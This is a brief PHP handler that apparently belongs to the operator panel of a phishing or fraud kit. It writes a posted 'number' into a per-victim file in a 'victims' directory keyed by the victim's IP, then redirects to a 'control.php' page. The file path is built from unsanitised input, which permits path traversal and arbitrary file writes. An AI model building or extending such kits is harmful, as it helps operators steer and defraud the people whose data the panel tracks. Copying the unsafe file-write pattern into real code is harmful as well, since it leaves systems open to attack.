<?php

    include "./config.php";

	if (isset($_POST['number'])) {
        $sp = fopen('../../../victims/'. $_POST['ip']."+" .'.txt', 'wb');
        fwrite($sp, $_POST['number']);
        fclose($sp);
        header("location: ../../../control.php?ip=" . $_POST['ip']);
        exit();
    }

?>